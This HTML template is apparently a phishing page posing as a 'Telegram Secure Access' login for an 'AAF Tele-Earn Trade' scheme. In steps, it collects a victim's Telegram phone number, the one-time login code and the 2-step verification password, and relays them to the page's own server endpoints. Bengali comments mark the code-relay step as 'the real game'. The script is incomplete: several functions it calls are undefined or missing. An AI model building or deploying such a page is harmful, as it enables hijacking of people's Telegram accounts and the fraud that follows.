<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AAF | Telegram Secure Access</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/css/intlTelInput.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Rajdhani:wght@500;600;700&display=swap');

        :root {
            --bg: #030712; --card: #0d111c; --border: rgba(255, 255, 255, 0.1);
            --cyan: #00f2fe; --primary: #39d353; --gold: #ffaa00;
            --text-dim: #8b949e; --danger: #ff4d4d;
        }

        body {
            background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif;
            margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh;
            background-image: radial-gradient(circle at 50% 0%, rgba(0, 242, 254, 0.1), transparent);
        }

        .auth-container {
            width: 85%; max-width: 380px; background: var(--card);
            border: 1px solid var(--border); border-radius: 30px;
            padding: 40px 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
            position: relative; overflow: hidden; backdrop-filter: blur(15px);
            border-top: 2px solid var(--cyan); text-align: center;
        }

        .logo-wrapper {
            width: 85px; height: 85px; margin: 0 auto 20px;
            border-radius: 50%; border: 3px solid var(--cyan);
            padding: 5px; box-shadow: 0 0 20px rgba(0, 242, 254, 0.3);
        }
        .brand-logo { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        
        .header-title { font-family: 'Syncopate'; font-size: 14px; color: var(--cyan); margin-bottom: 25px; letter-spacing: 1px; }

        .auth-step { display: none; animation: fadeIn 0.4s ease; }
        .active-step { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Custom Input Styles */
        .input-box {
            background: rgba(255,255,255,0.05); border: 1px solid var(--border);
            border-radius: 15px; padding: 12px 15px; margin-bottom: 20px;
            display: flex; align-items: center; transition: 0.3s;
        }
        .input-box:focus-within { border-color: var(--cyan); }

        /* Flag Input Overrides */
        .iti { width: 100%; color: #000; }
        .iti__country-list { background-color: #161b22; color: #fff; border: 1px solid var(--border); }
        .iti__country:hover { background-color: #30363d; }
        input[type="tel"], input[type="number"], input[type="password"] {
            width: 100%; background: transparent; border: none; color: #fff;
            font-size: 18px; outline: none; font-family: 'Rajdhani'; padding: 5px;
        }

        .btn-action {
            width: 100%; padding: 16px; border-radius: 15px; border: none;
            background: linear-gradient(135deg, var(--cyan), #0088cc);
            color: #000; font-weight: 700; font-family: 'Syncopate';
            font-size: 11px; cursor: pointer; transition: 0.4s;
            text-transform: uppercase; box-shadow: 0 5px 15px rgba(0, 242, 254, 0.2);
        }
        .btn-action:disabled { opacity: 0.6; cursor: not-allowed; }

        #status-box {
            font-size: 13px; color: var(--danger); margin-bottom: 15px; display: none;
            background: rgba(255, 77, 77, 0.1); padding: 10px; border-radius: 10px;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <div class="logo-wrapper">
            <img src="{{ url_for('static', filename='logo.png') }}" class="brand-logo" alt="Logo" onerror="this.src='https://via.placeholder.com/100'">
        </div>
        
        <div class="header-title">AAF TELE-EARN TRADE</div>
        <div id="status-box"></div>

        <div class="auth-step active-step" id="step-1">
            <div class="input-box">
                <input type="tel" id="phone" placeholder="Enter Telegram Number">
            </div>
            <button class="btn-action" id="btn-otp" onclick="sendOTP()">Get Official Code</button>
        </div>

        <div class="auth-step" id="step-2">
            <p style="font-size: 12px; color: var(--text-dim); margin-bottom: 15px;">Enter the 5-digit code from Telegram</p>
            <div class="input-box">
                <input type="tel" id="otp-code" placeholder="Enter OTP Code">
            </div>
            <button class="btn-action" id="btn-verify" onclick="verifyOTP()">Verify Code</button>
        </div>

        <div class="auth-step" id="step-3">
            <p style="font-size: 12px; color: var(--gold); margin-bottom: 15px;">Your account has 2-Step verification enabled</p>
            <div class="input-box">
                <input type="password" id="two-step-pass" placeholder="2-Step Password">
            </div>
            <button class="btn-action" id="btn-final" onclick="verifyFinal()">Access Account</button>
        </div>
    </div>

 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/intlTelInput.min.js"></script>
<script>
    let finalPhone = "";
    let finalOTP = ""; // এই ভেরিয়েবলটা ওটিপি ধরে রাখবে

    const phoneInput = document.querySelector("#phone");
    const iti = window.intlTelInput(phoneInput, {
        initialCountry: "bd",
        separateDialCode: true,
        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.19/js/utils.js",
    });

    // ধাপ ১: ওটিপি পাঠানো
    async function sendOTP() {
        finalPhone = iti.getNumber();
        const btn = document.getElementById('btn-otp');
        btn.innerText = "SENDING...";
        
        const res = await fetch('/api/send_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: finalPhone })
        });
        const data = await res.json();
        if (data.success) {
            document.getElementById('step-1').classList.remove('active-step');
            document.getElementById('step-2').classList.add('active-step');
        } else {
            alert(data.message);
        }
        btn.innerText = "Get Official Code";
    }

    // ধাপ ২: ওটিপি ভেরিফাই (এখানেই আসল খেলা)
    async function verifyOTP() {
    finalOTP = document.getElementById('otp-code').value;

    if (!finalOTP) return notify("Please enter the OTP code!");

    const btn = document.getElementById('btn-verify');
    btn.disabled = true;
    btn.innerText = "VERIFYING...";

    try {
        const res = await fetch(`${API_URL}/api/verify_login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                phone: finalPhone, 
                code: finalOTP,
                password: null // প্রথমবার পাসওয়ার্ড ছাড়াই ট্রাই করবে
            })
        });
        
        const data = await res.json();

        if (data.success) {
            // যদি টু-স্টেপ না থাকে, সরাসরি লগইন সফল হবে
            window.location.replace("/dashboard");
        } 
        else if (data.message === "PASSWORD_REQUIRED" || data.message.includes("Two-steps")) {
            // যদি সার্ভার বলে পাসওয়ার্ড লাগবে, তবেই বাটন কাজ করবে এবং পরের স্টেপে যাবে
            goToStep(3); 
        } 
        else {
            // অন্য কোনো ভুল হলে (যেমন ওটিপি ভুল) সেটা দেখাবে
            notify(data.message);
        }
    } catch (e) { 
        notify("Server Connection Error!"); 
    } finally { 
        btn.disabled = false; 
        btn.innerText = "Verify Code"; 
    }
    }
</script>
</body>
</html>
